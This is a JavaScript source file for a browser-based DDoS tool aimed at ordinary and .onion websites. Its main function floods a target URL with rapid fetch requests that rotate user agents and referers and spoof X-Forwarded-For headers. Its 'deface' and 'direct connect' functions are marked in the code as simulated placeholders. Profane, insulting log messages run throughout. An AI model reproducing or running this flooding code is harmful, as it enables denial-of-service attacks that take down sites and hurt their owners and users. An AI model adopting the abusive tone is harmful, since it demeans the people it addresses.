// ddos any site including .onion sites
// USE referers.txt AND useragents.txt

async function ddosAttack(target, type = 'http', duration = 60, threads = 100, deface = false, connect = false, customHeaders = '') {
  if (!target) {
    log('ERROR: Target URL is required. Fucking idiot.');
    return;
  }

  log(`Initiating ${type.toUpperCase()} DDoS attack on ${target} for ${duration} seconds with ${threads} threads. Let's fuck shit up!`);

  if (deface) {
    log('Defacing target... Get ready for chaos, motherfucker!');
    defaceWebsite(target);
  }

  if (connect) {
    log('Establishing direct connection... Prepare for intrusion, you piece of shit!');
    directConnect(target);
  }

  const referers = await loadFile('referers.txt');
  const userAgents = await loadFile('useragents.txt');

  if (!referers || !userAgents) {
    log('ERROR: Could not load referers.txt or useragents.txt. Make sure these files exist, dumbass.');
    return;
  }

  let parsedCustomHeaders = {};
  if (customHeaders) {
    try {
      parsedCustomHeaders = JSON.parse(customHeaders);
    } catch (e) {
      log('ERROR: Invalid JSON format for custom headers. Ignoring. What a loser.');
    }
  }

  const attackStartTime = Date.now();
  let attackInterval = null;
  let abortController = new AbortController();

  if (type === 'http' || type === 'onion') {
    attackInterval = setInterval(() => {
      for (let i = 0; i < threads; i++) {
        const headers = {
          'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
          'Referer': referers[Math.floor(Math.random() * referers.length)],
          'X-Forwarded-For': generateRandomIP(), // Spoof IP
          ...parsedCustomHeaders,
        };

        fetch(target, {
          method: 'GET', // or 'POST'
          mode: 'no-cors',
          headers: headers,
          signal: abortController.signal, // Abort requests if needed
        }).then(response => {
          // Log success or failure (optional)
          if (!response.ok) {
              log(`Request failed: ${response.status} - ${target}`);
          }
        }).catch(error => {
          // Log error
          // console.error('Request error:', error);
        });
      }
    }, 0); // Run as fast as possible
  } else {
    log(`ERROR: Invalid attack type: ${type}. Choose 'http' or 'onion'. You moron.`);
    clearInterval(attackInterval);
    abortController.abort();
    return;
  }

  setTimeout(() => {
    clearInterval(attackInterval);
    abortController.abort();
    log('DDoS attack finished. Hope we fucked them good!');
  }, duration * 1000);
}

async function loadFile(filename) {
  try {
    const response = await fetch(filename);
    const text = await response.text();
    return text.split('\n').filter(line => line.trim() !== '');
  } catch (error) {
    log(`ERROR: Could not load file ${filename}: ${error}. File probably doesn't exist, dumbass.`);
    return null;
  }
}

function log(message) {
  const logsElement = document.getElementById('logs');
  if (logsElement) {
    logsElement.innerHTML += message + '<br>';
    logsElement.scrollTop = logsElement.scrollHeight; // Auto-scroll
  } else {
    console.log(message);
  }
}

async function defaceWebsite(target) {
  // THIS IS JUST A SIMULATION. REAL DEFACING REQUIRES EXPLOITS.
  log(`Attempting to deface ${target}... Injecting HACKED message! (SIMULATED)`);

  try {
    const response = await fetch(target, {
      method: 'GET',
      mode: 'no-cors'
    });

    if (response.ok) {
      // Try to inject the defacement code

      log(`Successfully injected HACKED message into ${target}! (SIMULATED)`);

    } else {
      log(`Failed to inject HACKED message. Status: ${response.status} (SIMULATED)`);
    }
  } catch (error) {
    log(`Deface attempt failed: ${error} (SIMULATED)`);
  }
}

function directConnect(target) {
  // THIS IS JUST A SIMULATION. ACTUAL CONNECTION REQUIRES PORTSCANNING AND VULNS.

  log(`Attempting direct connection to ${target}... Initiating intrusion! (SIMULATED)`);

  //  Attempt to establish a connection to the target server
  // and perform malicious actions. This is a placeholder.
  // Real direct connections require serious hacking knowledge and network tools.
  // Implement port scanning and exploit attempts here (IN REAL LIFE).
}

function generateRandomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

// Expose the ddosAttack function globally (for calling from HTML)
window.ddosAttack = ddosAttack;